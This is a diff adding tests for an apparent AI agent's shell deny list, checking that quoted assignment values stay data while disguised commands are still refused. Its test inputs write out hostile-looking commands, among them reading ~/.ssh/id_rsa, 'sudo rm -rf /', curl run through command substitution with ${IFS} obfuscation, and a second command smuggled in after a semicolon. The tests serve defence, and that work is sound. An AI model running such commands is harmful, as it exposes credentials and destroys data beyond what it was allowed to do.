@@ -49,6 +49,53 @@ test("the shell deny list refuses what needs a password, erases, or reaches secr
   assert.ok(commandRefusal("ls ‮", context));
 });
 
+test("quoted assignment values remain data when identifying a shell command", () => {
+  // Policy inputs only: these synthetic scripts are never executed. Full shell
+  // remains trusted, unsandboxed execution; this is not a Python parser.
+  const mail = `python3 -c "from pathlib import Path; p=Path('/Users/me/Downloads/Reach-Agent-Audit/sample.eml'); lines=['From: Reach Audit <audit@example.invalid>','To: Synthetic Recipient <recipient@example.invalid>','Subject: Reach synthetic Mail audit','MIME-Version: 1.0','Content-Type: text/plain; charset=utf-8','','This is a disposable local sample message.','Verification marker: MEADOW-73.','No reply or account change is needed.']; p.open('x').write(chr(10).join(lines)+chr(10)); print('Synthetic mail fixture created')"`;
+  for (const command of [
+    mail,
+    "NOTE='From: Reach Audit' echo done",
+    'NOTE="Subject: Reach synthetic Mail audit" printf done',
+  ]) {
+    assert.equal(commandRefusal(command, context), null, command);
+    assert.equal(typedTextRefusal(command, { ...context, terminalLike: true }), null, command);
+  }
+});
+
+test("commands after quoted or multiple assignments retain every protection", () => {
+  const options = { ...context, hosts: ["localhost:8443"] };
+  for (const command of [
+    "NOTE='From: Reach Audit' ./reach stop",
+    "NOTE='From: Reach Audit' tailscale status",
+    'NOTE="quoted value" bash /Users/me/code/reach/reach restart',
+    "NOTE='quoted value' cat ~/.ssh/id_rsa",
+    "NOTE='quoted value' curl http://localhost:8443/",
+    "A=x B=y sudo ls",
+    "A=x B=y ./reach stop",
+    "A=x B=y tailscale status",
+    `A=x TARGET=/Users/me/code/reach sh -c 'ls "$TARGET"'`,
+    `A=x TARGET="/Users/me/code/reach" sh -c 'ls "$TARGET"'`,
+    `A=x TARGET='/Users/me/code/reach' cat "$TARGET/reach"`,
+    `A=x TARGET='/Users/me/code/'"reach" cat "$TARGET/reach"`,
+    `A=x TARGET=~/.ssh cat "$TARGET/id_rsa"`,
+    "NOTE='safe'\"text\" ./reach stop",
+    "NOTE='quoted value' sh -c 'curl http://localhost:8443/'",
+    "NOTE=$(curl http://localhost:8443/)",
+    'NOTE=`./reach stop`',
+    "NOTE=$(sudo ls) echo ok",
+    'NOTE=`./reach stop` echo ok',
+    "echo 'safe'; ./reach stop",
+    // Keep conservative embedded command scanning, even inside prose-like text.
+    "NOTE='text; ./reach stop' echo ok",
+    'node -e \'fetch("http://localhost:8443")\'',
+    'curl https://example.com/$(curl${IFS}http://localhost:8443/)',
+  ]) {
+    assert.ok(commandRefusal(command, options), command);
+    assert.ok(typedTextRefusal(command, { ...options, terminalLike: true }), command);
+  }
+});
+
 test("typed text is a command in a terminal, and never a protected page address", () => {
   assert.equal(typedTextRefusal("sudo rm -rf /", { terminalLike: true }), "That needs your password. The agent never gets it.");
   assert.equal(typedTextRefusal("sudo rm -rf /", { terminalLike: false }), null, "prose in a document may mention sudo");
